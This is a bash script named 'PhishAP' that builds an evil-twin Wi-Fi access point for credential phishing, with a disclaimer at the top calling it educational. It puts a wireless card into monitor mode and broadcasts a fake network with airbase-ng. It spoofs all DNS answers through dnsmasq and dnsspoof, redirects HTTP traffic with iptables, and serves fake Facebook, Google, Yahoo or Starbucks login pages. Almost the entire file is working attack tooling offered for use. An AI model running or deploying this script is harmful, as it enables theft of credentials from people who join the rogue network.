#!/usr/bin/env bash

#--------------------------------
# NO PASSWORD IS DISPLAYED!!!!   
# FOR EDUCATIONAL PURPOSES ONLY!
#--------------------------------

CLEAN="\033[0m"
RED='\033[01;31m'
YELLOW='\033[01;33m'
WHITE='\033[01;37m'
GREEN='\033[01;32m'
BOLD='\033[1m'

if [ "$EUID" -ne 0 ]
  then printf "${RED}[-]${CLEAN} Please, run as root\n"
  exit
fi

if ! hash airbase-ng 2>/dev/null; then
  printf "${RED}[-]${CLEAN} Please, install airbase-ng\n"; exit 3
fi

if ! hash dnsmasq 2>/dev/null; then
  printf "${RED}[-]${CLEAN} Please, install dnsmasq\n"; exit 3
fi

if ! hash xterm 2>/dev/null; then
  printf "${RED}[-]${CLEAN} Please, install xterm\n"; exit 3
fi

if ! hash python3 2>/dev/null; then
  printf "${RED}[-]${CLEAN} Please, install python3\n"; exit 3
fi

#Create dnsmasq config file
makeconf() {
	printf "interface=at0\n" >> conf/dnsmasq.conf
	printf "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,8h\n" >> conf/dnsmasq.conf
	printf "dhcp-option=3,10.0.0.1\n" >> conf/dnsmasq.conf
	printf "dhcp-option=6,10.0.0.1\n" >> conf/dnsmasq.conf
	printf "server=8.8.8.8\n" >> conf/dnsmasq.conf
	printf "log-queries\n" >> conf/dnsmasq.conf
	printf "log-dhcp\n" >> conf/dnsmasq.conf
	printf "address=/#/10.0.0.1\n" >> conf/dnsmasq.conf
}

FILE=conf/dnsmasq.conf
if [ ! -f "$FILE" ]; then
    makeconf
fi

monitor() {
	printf "\n${YELLOW}[*]${CLEAN} Starting monitor mode...\n"
	ifconfig $iface down > /dev/null 2>&1
	iwconfig $iface mode monitor > /dev/null 2>&1
	ifconfig $iface up > /dev/null 2>&1
	sleep 2
	printf "${GREEN}[+]${CLEAN} Monitor mode... ${GREEN}OK${CLEAN}\n\n"
}

config() {
	ifconfig at0 up #up interface
	ifconfig at0 10.0.0.1 netmask 255.255.255.0 #set gateway
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 #create the route
	iptables -P FORWARD ACCEPT #enable forward
	iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 #redirect http req to gateway
	echo "1" > /proc/sys/net/ipv4/ip_forward #enable forward
}

fake_ap() {
	echo -e "${YELLOW}[*]${CLEAN} Creating Fake-Ap network..." 
	xterm -geometry "95x15-0+0" -bg black -fg green -title "FAKE-AP - PhishAP" -e zsh -c "airbase-ng $iface -e "$essid"" > /dev/null 2>&1 &
	echo -e "${GREEN}[+]${CLEAN} Fake AP... ${GREEN}OK${CLEAN}\n" 
	sleep 3
	config
	printf "${YELLOW}[*]${CLEAN} Starting DNSMasq...\n"
	sleep 3
	pkill dnsmasq
	xterm -geometry "95x19-0+230" -bg black -fg yellow -title "DNSMASQ - PhishAP" -e zsh -c "dnsmasq -C conf/dnsmasq.conf -d" > /dev/null 2>&1 &
	xterm -geometry "95x15-0+550" -bg black -fg red -title "DNSSPOOF - PhishAP" -e zsh -c "dnsspoof -i at0" > /dev/null 2>&1 &
	echo -e "${GREEN}[+]${CLEAN} DNSMasq... ${GREEN}OK${CLEAN}\n" 
}

http_server() {
	printf "${YELLOW}[?]${CLEAN} - Choose your fake page\n\n"
	printf "${YELLOW}[*]${CLEAN} 1 - Facebook Login\n"
	printf "${YELLOW}[*]${CLEAN} 2 - Google Login\n"
	printf "${YELLOW}[*]${CLEAN} 3 - Yahoo Login\n"
	printf "${YELLOW}[*]${CLEAN} 4 - Starbucks Login\n\n"
prompt="Pick an option:"
options=("1" "2" "3" "4") > /dev/null 2>&1 &
PS3="$prompt "
select opt in "${options[@]}" "Quit"; do 
    case "$REPLY" in
    1) python3 -m http.server 80 -d templates/facebook-login/;;
    2) python3 -m http.server 80 -d templates/google-login/;;
    3) python3 -m http.server 80 -d templates/yahoo-login/;;
    4) python3 -m http.server 80 -d templates/starbucks-login/;;
    $((${#options[@]}+1))) echo "${GREEN}[!]${CLEAN} Goodbye!"; break;;
    *) printf "${RED}[-]${CLEAN} Invalid option. Try another one.";continue;;
    esac
done
}

banner() {
	clear
	echo -e "${BOLD}  _     _  ___          _______  ___  ${CLEAN}"
	echo -e "${BOLD} | | _ | ||   |        |       ||   | ${CLEAN}"
	echo -e "${BOLD} | || || ||   |  ____  |    ___||   | ${CLEAN}${YELLOW}PhishAP - Fake-AP Creator${CLEAN}"
	echo -e "${BOLD} |       ||   | |____| |   |___ |   | ${CLEAN}${YELLOW}Version 1.0${CLEAN}"
	echo -e "${BOLD} |       ||   |        |    ___||   | ${CLEAN}${YELLOW}xpsecsecurity.com${CLEAN}"
	echo -e "${BOLD} |   _   ||   |        |   |    |   | ${CLEAN}"
	echo -e "${BOLD} |__| |__||___|        |___|    |___| ${CLEAN}"
	printf "\n\n"
}

main() {
	airmon-ng
	printf "${YELLOW}[*]${CLEAN} Set your Wi-Fi interface: "
	read iface
	printf "${YELLOW}[*]${CLEAN} Fake-AP name: "
	read essid
	banner
	monitor
	fake_ap
	http_server
}

banner
main
